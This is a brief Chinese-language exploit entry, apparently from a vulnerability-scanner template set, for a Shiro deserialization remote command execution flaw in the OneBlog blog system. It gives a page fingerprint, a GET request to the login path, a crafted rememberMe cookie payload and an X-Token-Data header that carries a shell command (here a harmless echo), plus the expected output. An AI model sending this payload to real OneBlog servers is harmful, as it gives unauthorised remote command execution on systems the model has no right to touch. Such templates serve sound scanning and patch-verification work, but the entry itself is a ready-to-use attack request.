# OneBlog博客Shiro反序列化远程命令执行漏洞

- **系统**：OneBlog　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/assets/js/zhyd.tool.js"`
- **请求**：`GET /passport/login/ HTTP/1.1`
- **关键头**：`Cookie: rememberMe=MERiOWRmRTYzRTVhRTdkNAV5Arkl/IQSpndZljnVXl9lknV7+t4WiqqsrNoVml0c4nVuX…`　`X-Token-Data: echo "dudesuite"`
- **预期**：200　|　dudesuite